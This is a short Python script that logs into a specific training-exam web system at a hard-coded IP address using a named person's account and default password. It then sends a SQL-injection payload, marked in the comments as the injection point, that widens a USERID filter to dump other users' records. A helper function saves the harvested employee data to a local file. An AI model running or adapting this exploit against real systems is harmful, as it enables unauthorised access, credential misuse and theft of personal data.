#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2018/2/5 下午5:08
# @Author  : Anchor
# @File    : trainexam.py
# @Des     : 培训考试系统

from urllib import request
from urllib import parse
from http import cookiejar
import base64
import hashlib

def md5(password):
    m = hashlib.md5()
    m.update(password.encode("utf-8"))
    return m.hexdigest()

def login(username,password):
    # 登录地址
    login_url = 'http://123.232.10.234:8093/TrainExam/servlet/com.sdjxd.pms.platform.serviceBreak.Invoke'
    user_agent = r'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'
    # Headers信息
    head = {'User-Agnet': user_agent, 'Connection': 'keep-alive'}
    # 登陆Login_Data信息
    Login_Data = {
        '_c': 'com.sdjxd.pms.platform.organize.User',
        '_m': 'loginByEncode',
        '_p0': bytes.decode(username),
        '_p1': password
    }
    # 使用urlencode方法转换标准格式
    logingpostdata = parse.urlencode(Login_Data).encode('utf-8')
    # 声明一个CookieJar对象实例来保存cookie
    cookie = cookiejar.CookieJar()
    # 利用urllib.request库的HTTPCookieProcessor对象来创建cookie处理器,也就CookieHandler
    cookie_support = request.HTTPCookieProcessor(cookie)
    # 通过CookieHandler创建opener
    opener = request.build_opener(cookie_support)
    # 创建Request对象
    request_login = request.Request(url=login_url, data=logingpostdata, headers=head)
    # 使用自己创建的opener的open方法
    response = opener.open(request_login)
    #print(response.read().decode('gbk'))
    return opener

def getjson(opener):
    # 注入点
    inject_url = 'http://123.232.10.234:8093/TrainExam/servlet/com.sdjxd.pms.platform.serviceBreak.Invoke?p=311731BF-42A3-4FA1-99C9-407B78B2BE81&userid=1ED10BCD-A0B5-4556-1ACE-958A78AB6EE2'
    user_agent = r'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36'
    # Headers信息
    head = {'User-Agnet': user_agent, 'Connection': 'keep-alive'}
    # 注入参数
    Login_Data = {
        '_c': 'com.sdjxd.pms.platform.form.service.minicell.MiniDataGrid',
        '_m': 'getListData',
        '_p0': '',
        '_p1': '\"311731BF-42A3-4FA1-99C9-407B78B2BE81\"',
        '_p2': '7',
        '_p3': '\"9AB8A173-454A-45E7-999A-AFE3954D46F2\"',
        '_p4': '\"SHEETID ASC\"',
        '_p5': '\"USERID = \'1ED10BCD-A0B5-4556-1ACE-958A78AB6EE2\' OR (USERID = \'E8DB66CC-10CF-6734-BA6C-7E857771F9DE\' AND \'\'=\'1\')\"',
        '_p6': '2',
        '_p7': '20'
    }
    # 使用urlencode方法转换标准格式
    logingpostdata = parse.urlencode(Login_Data).encode('utf-8')
    # 创建Request对象
    request_emp = request.Request(url=inject_url, data=logingpostdata, headers=head)
    # 使用自己创建的opener的open方法
    response = opener.open(request_emp)
    # 清洗数据
    print(response.read().decode('gbk'))
    # cleanJson(response.read().decode('gbk'))


def cleanJson(response):
    if '#' in response:
        # 切割提取有用数据
        empinfo = response.split('#')[1]
        with open('./emp/json/incre/increuser.txt','a') as alluser:
            print(empinfo)
            alluser.write(empinfo+'\n')
    else:
        # 垃圾数据直接pass
        pass

if __name__ == '__main__':
    # 预设账号获取cookie进行访问
    opener = login(base64.b64encode('董玉芬'.encode(encoding="gbk")),md5('888888'))
    getjson(opener)